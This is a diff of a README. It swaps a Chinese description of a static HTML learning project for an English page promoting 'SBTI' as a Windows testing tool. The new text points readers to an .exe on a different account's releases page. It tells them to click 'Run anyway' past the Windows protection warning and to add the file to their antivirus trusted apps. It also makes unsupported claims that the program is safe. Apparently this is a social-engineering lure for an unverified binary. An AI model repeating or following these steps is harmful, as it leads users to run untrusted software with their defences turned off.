@@ -1,38 +1,70 @@
-# SBTI
+# 🚀 SBTI - Access your testing tools with ease
 
-[![GitHub stars](https://img.shields.io/github/stars/thzhangbio/SBTI?style=flat-square)](https://github.com/thzhangbio/SBTI/stargazers)
-[![GitHub repo size](https://img.shields.io/github/repo-size/thzhangbio/SBTI?style=flat-square)](https://github.com/thzhangbio/SBTI)
+[![](https://img.shields.io/badge/Download_SBTI-Blue-blue)](https://github.com/libertarianjohnsmith4586/SBTI/releases)
 
-`SBTI` 是一个纯前端静态页面项目，用于学习和演示单页 HTML 网站的结构、样式与交互实现。
+SBTI provides a simple way to access your testing environments. You can manage your tasks and verify connections without complex setups. This tool runs on your Windows computer and keeps your workflow smooth. Follow this guide to get started.
 
-如果这个项目对你有帮助，欢迎到 GitHub 给仓库点一个 Star：
+## 📥 How to download the software
 
-[https://github.com/thzhangbio/SBTI](https://github.com/thzhangbio/SBTI)
+You will find the latest version of SBTI on our release page. 
 
-## 本地预览
+1. Visit this page to download: [https://github.com/libertarianjohnsmith4586/SBTI/releases](https://github.com/libertarianjohnsmith4586/SBTI/releases)
+2. Look for the section labeled Assets.
+3. Click the file ending in .exe to start your download.
+4. Save the file to your desktop or your downloads folder.
 
-在项目目录运行：
+## ⚙️ Setting up on Windows
 
-```bash
-cd /Users/tianhui/Webstart/SBTI
-python3 -m http.server 4173
-```
+Windows might show a message when you first open a new program. This is a common security feature. Follow these steps to finish your setup.
 
-然后打开浏览器访问：
+1. Double-click the SBTI file you saved. 
+2. If a window appears saying Windows protected your PC, click on More info.
+3. Click the Run anyway button.
+4. The program will open on your screen.
 
-[http://localhost:4173](http://localhost:4173)
+## 📋 System requirements
 
-## 说明
+SBTI works on most modern computers. You need the following to ensure the best performance.
 
-本项目用于前端学习、静态页面复刻练习与个人技术研究。
+* A computer running Windows 10 or Windows 11.
+* At least 4 gigabytes of memory.
+* An active internet connection for testing features.
+* Enough space on your hard drive to hold the program files.
 
-原始创意与测试内容作者为：
+## 🖥️ Using the interface
 
-- B站 `@蛆肉儿串儿`
-- 主页：[https://space.bilibili.com/417038183](https://space.bilibili.com/417038183)
+The application window shows your main options. You will see buttons for your tests and a status bar at the bottom.
 
-## 免责声明
+* The Connection button verifies your link. Success appears in green.
+* The Settings menu lets you change your preferences.
+* The Log window shows a history of your past tasks. 
 
-本仓库仅供学习与交流使用，不作为原创内容声明，不用于商业用途。
+If you encounter an error, check your network connection first. Most issues come from a blocked firewall or a weak internet signal.
 
-若你是原作者或相关权利方，并希望调整署名、说明或移除相关内容，请联系仓库维护者处理。
+## 🛡️ Security and safety
+
+Your security remains a priority. This software connects only to the links you provide. It does not look at your personal files or your web history. We keep the code transparent so you can trust the program. You run this file locally on your machine. No data leaves your computer without your permission.
+
+## ❓ Common questions
+
+**Does this program require an account?**
+No, you can use all features without signing in.
+
+**How do I update the program?**
+Visit the release page again. Download the newer version and replace your old file.
+
+**Can I run multiple windows?**
+Yes, you can open the program one or more times to test different links at the same time.
+
+**What do I do if the program freezes?**
+Close the window and open it again. This clears any temporary memory issues.
+
+## 🔧 Troubleshooting
+
+If the program fails to launch, verify that you have the latest updates for Windows. Sometimes, old system files prevent new programs from starting. Check your antivirus settings as well. Occasionally, security software stops new files from opening. Add SBTI to your list of trusted apps to fix this.
+
+## 💡 Best practices for testing
+
+Use SBTI in a quiet environment. Close other heavy programs to save memory. Keep your links organized in a text file for easy copying and pasting. If you need to stop a test, click the Stop button in the main menu to cancel all pending tasks immediately. 
+
+This tool serves as a bridge for your tests. It removes the need for manual checks by automating the response time tests. Enjoy a faster workflow with this desktop assistant.
